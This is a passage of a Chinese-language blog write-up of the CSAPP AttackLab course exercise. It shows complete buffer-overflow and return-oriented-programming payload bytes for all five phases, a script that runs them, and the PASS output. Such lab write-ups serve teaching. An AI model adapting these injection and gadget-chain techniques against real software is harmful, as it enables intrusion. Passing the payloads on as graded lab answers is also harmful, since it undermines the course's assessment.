class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">dd</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">70</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">13</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">d6</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">fa</span> <span class="hljs-number">18</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span><br></code></pre></td></tr></table></figure>
+<p>运行结果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./rtarget -qi ./answer/phase_5/output <br>Cookie: 0x59b997fa<br>Touch3!: You called touch3(<span class="hljs-string">&quot;59b997fa&quot;</span>)<br>Valid solution <span class="hljs-keyword">for</span> level 3 with target rtarget<br>PASS: Would have posted the following:<br>        user <span class="hljs-built_in">id</span> bovik<br>        course  15213-f15<br>        lab     attacklab<br>        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 70 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 <br></code></pre></td></tr></table></figure>
+<h2 id="总结">总结</h2>
+<p>我们最后写一个简单的脚本 <code>auto.sh</code> 来庆祝一下吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>./ctarget -qi ./answer/phase_1/output<br>./ctarget -qi ./answer/phase_2/output<br>./ctarget -qi ./answer/phase_3/output<br>./rtarget -qi ./answer/phase_4/output<br>./rtarget -qi ./answer/phase_5/output<br></code></pre></td></tr></table></figure>
+<p>运行结果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./auto.sh <br>Cookie: 0x59b997fa<br>Touch1!: You called touch1()<br>Valid solution <span class="hljs-keyword">for</span> level 1 with target ctarget<br>PASS: Would have posted the following:<br>        user <span class="hljs-built_in">id</span> bovik<br>        course  15213-f15<br>        lab     attacklab<br>        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 <br>Cookie: 0x59b997fa<br>Touch2!: You called touch2(0x59b997fa)<br>Valid solution <span class="hljs-keyword">for</span> level 2 with target ctarget<br>PASS: Would have posted the following:<br>        user <span class="hljs-built_in">id</span> bovik<br>        course  15213-f15<br>        lab     attacklab<br>        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 <br>Cookie: 0x59b997fa<br>Touch3!: You called touch3(<span class="hljs-string">&quot;59b997fa&quot;</span>)<br>Valid solution <span class="hljs-keyword">for</span> level 3 with target ctarget<br>PASS: Would have posted the following:<br>        user <span class="hljs-built_in">id</span> bovik<br>        course  15213-f15<br>        lab     attacklab<br>        result  1:PASS:0xffffffff:ctarget:3:48 8D 24 25 78 DC 61 55 48 8D 3C 25 90 DC 61 55 68 FA 18 40 00 C3 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 <br>Cookie: 0x59b997fa<br>Touch2!: You called touch2(0x59b997fa)<br>Valid solution <span class="hljs-keyword">for</span> level 2 with target rtarget<br>PASS: Would have posted the following:<br>        user <span class="hljs-built_in">id</span> bovik<br>        course  15213-f15<br>        lab     attacklab<br>        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 <br>Cookie: 0x59b997fa<br>Touch3!: You called touch3(<span class="hljs-string">&quot;59b997fa&quot;</span>)<br>Valid solution <span class="hljs-keyword">for</span> level 3 with target rtarget<br>PASS: Would have posted the following:<br>        user <span class="hljs-built_in">id</span> bovik<br>        course  15213-f15<br>        lab     attacklab<br>        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 70 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 <br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CSAPP-lab/" class="category-chain-item">CSAPP_lab</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CSAPP-lab/">#CSAPP_lab</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CSAPP_lab AttackLab</div>
+      <div>https://nishikichisato.github.io/2023/06/27/CSAPP_LAB/AttkackLab/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Nishiki Chisato</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>June 27, 2023</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Updated on</div>
+          <div>June 27, 2023</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="SA - Share-alike">
+                    <i class="iconfont icon-sa"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/07/03/CSAPP_LAB/ArchitectureLab/" title="CSAPP_lab ArchitectureLab">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CSAPP_lab ArchitectureLab</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/05/04/CSAPP_LAB/BombLab/" title="CSAPP_lab BombLab">
+                        <span class="hidden-mobile">CSAPP_lab BombLab</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-left: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="CSAPP_lab"
+        id="heading-24d6582ec3d2ffe8d6c95577e02bb950" role="tab" data-toggle="collapse" href="#collapse-24d6582ec3d2ffe8d6c95577e02bb950"
+        aria-expanded="true"
+      >
+        CSAPP_lab
+        <span class="list-group-count">(7)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-24d6582ec3d2ffe8d6c95577e02bb950"
+           role="tabpanel" aria-labelledby="heading-24d6582ec3d2ffe8d6c95577e02bb950">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2023/07/03/CSAPP_LAB/ArchitectureLab/" title="CSAPP_lab ArchitectureLab"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CSAPP_lab ArchitectureLab</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/06/27/CSAPP_LAB/AttkackLab/" title="CSAPP_lab AttackLab"
+           class="list-group-item list-group-item-action
+           active">
+          <span class="category-post">CSAPP_lab AttackLab</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/05/04/CSAPP_LAB/BombLab/" title="CSAPP_lab BombLab"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CSAPP_lab BombLab</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/07/08/CSAPP_LAB/CacheLab/" title="CSAPP_lab CacheLab"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CSAPP_lab CacheLab</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/04/22/CSAPP_LAB/DataLab/" title="CSAPP_lab DataLab"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CSAPP_lab DataLab</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/07/25/CSAPP_LAB/MallocLab/" title="CSAPP_lab MallocLab"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CSAPP_lab MallocLab</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/07/16/CSAPP_LAB/ShellLab/" title="CSAPP_lab ShellLab"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CSAPP_lab ShellLab</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    
+      <script  src="/js/img-lazyload.js" ></script>
+    
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
